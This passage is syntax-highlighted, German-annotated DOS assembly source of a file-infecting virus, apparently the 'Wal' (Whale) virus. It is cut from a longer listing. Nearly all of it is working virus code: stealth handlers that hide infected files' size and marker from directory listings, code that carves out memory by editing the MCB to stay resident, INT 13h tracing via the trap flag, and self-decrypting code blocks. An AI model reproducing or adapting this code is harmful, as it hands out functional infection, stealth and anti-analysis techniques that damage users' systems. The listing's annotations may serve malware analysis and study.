                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AD</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Lese in DS:DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AF</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Soviele Byte</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Gesamtzahl gelesen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">83</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J04704</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; Filepos</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AF</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Anzahl zu lesender byte</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,+</span><span class="sc2">1Ch</span><span class="sc0">                 </span><span class="sc1">; Summe &lt; 1Ch ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J04717</span><span class="sc0">                  </span><span class="sc1">; JMP wenn kleiner</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">                   </span><span class="sc1">; DI = 0</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J0471C</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0F7H</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J04717</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">01CH</span><span class="sc0">                 </span><span class="sc1">; DI ist z.B. 10H.</span><span class="sc0">
                                                </span><span class="sc1">; SUB DI,1C : DI = FFF4</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; NEG DI    : DI = 000B</span><span class="sc0">
</span><span class="sc5">J0471C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">84</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; Einen Paragrafen weiter</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FFEFH</span><span class="sc0">       </span><span class="sc1">; ergibt eine Rundung</span><span class="sc0">
                                        </span><span class="sc1">; auf volle Paragrafen</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">23FCh</span><span class="sc0">        </span><span class="sc1">; Wal-Size abziehen</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">         </span><span class="sc1">; SEEK from Start</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">           </span><span class="sc1">; READ FILE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AD</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AD</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AF</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J04767</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B1</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; SEEK from Start</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">                </span><span class="sc1">; zur Position 1Ch</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">84</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J046DF</span><span class="sc0">                  </span><span class="sc1">; zum nÑchsten TeilstÅck</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================( Handler fÅr FindFirst/Findnext /ASCIIZ)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04780</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">85</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FFFEH</span><span class="sc0">      </span><span class="sc1">; ZF lîschen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">85</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J047A5</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],+</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">J047A0</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                          </span><span class="sc1">; fertig</span><span class="sc0">
        </span><span class="sc1">;--------------------------;</span><span class="sc0">
        </span><span class="sc1">;J047A0: AND     AL,01     ;</span><span class="sc0">
        </span><span class="sc1">;        JMP     J02EA3    ;</span><span class="sc0">
        </span><span class="sc1">;--------------------------;</span><span class="sc0">

</span><span class="sc5">J047A5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetDTA</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J047B7</span><span class="sc0">                  </span><span class="sc1">; infiziert. Verschleiern !</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; Fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( Trash !!! )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J047B1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J047A0</span><span class="sc0">        </span><span class="sc1">; DB 0EBH ; sind jetzt 2 Byte zuviel</span><span class="sc0">
</span><span class="sc1">;-------------------------------------( 'echter code 'Åberlappend )---</span><span class="sc0">
</span><span class="sc5">J047B7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">86</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],+</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">86</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================( Kopiert Wal in oberen Speicher )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Wal_Ins_MEMTOP_Kopieren</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">87</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03350</span><span class="sc0">                  </span><span class="sc1">; selbsttest !</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; ursprÅnglich "PUSH    DS",</span><span class="sc0">
                                </span><span class="sc1">; geht aber nicht</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;       INT 3 wird auf 'IRET' im IBMBIO.COM gesetzt !</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">],</span><span class="sc2">0070h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc2">0756h</span><span class="sc0"> </span><span class="sc1">; an Adresse 70h:756h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,[</span><span class="sc5">PSP_SEG</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">],</span><span class="sc2">0270h</span><span class="sc1">; MEM-TOP neu festlegen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">                   </span><span class="sc1">; 2700h Byte 'reservieren'</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; SIEHE ZEICHNUNG GANZ OBEN !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; DS:0 zeigt auf MCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Hole Size des aktuellen MCB</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0270h</span><span class="sc0">                </span><span class="sc1">; und ziehe 2700h Byte AB</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; DX ist jetzt "MEM-TOP"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; MCB Ñndern</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; DI = 2947h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; 16 Byte hîher</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; ES ist ZielSegment</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">26FEh</span><span class="sc0">                </span><span class="sc1">; SI = 26FE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1380h</span><span class="sc0">                </span><span class="sc1">; CX = 1380h (words)</span><span class="sc0">
                                                </span><span class="sc1">;    = 2760h (byte)</span><span class="sc0">
                                                </span><span class="sc1">;    = bis Stackende  !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; DI = SI</span><span class="sc0">
                </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX = 0</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">87</span><span class="sc0">

                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSW</span><span class="sc0">                   </span><span class="sc1">; fort ist er !</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; erst jetzt ?!?</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Oberes Segment</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">SchwimmZiel</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; ZIEL IST      ES:01B1h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PSP_SEG</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; entsprechend  CS:29C1h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">WischeWeg</span><span class="sc0">            </span><span class="sc1">; CX = 236C</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Schwimme_Fort</span><span class="sc0">           </span><span class="sc1">; BX = 0</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================================( TRACE INT 13h )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Trace_int_13h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">88</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
 
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@Int_13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@Int_13h</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2450</span><span class="sc0">     </span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0"> </span><span class="sc1">; DL=2, 2 Åbergehen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_01</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D24DF</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D24DD</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">SS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0488D</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; RETURNADRESSE fÅr RETF ist</span><span class="sc0">
                                        </span><span class="sc1">; CS:J0207F, also CS:488D</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0070h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">       </span><span class="sc1">; Bis zum letzten Byte suchen ...</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc0">         </span><span class="sc1">; SCANNT IBMBIO nach 0CBh !!!</span><span class="sc0">
                </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">           </span><span class="sc1">; Also RETF</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; RETURNADRESSE ist "RETF" in IBMBIO.COM</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Set TF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
 
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">88</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                       </span><span class="sc1">; Reset Disk :-)</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Return ist J0488D</span><span class="sc0">
                                                    </span><span class="sc1">; JMP INT 13H</span><span class="sc0">
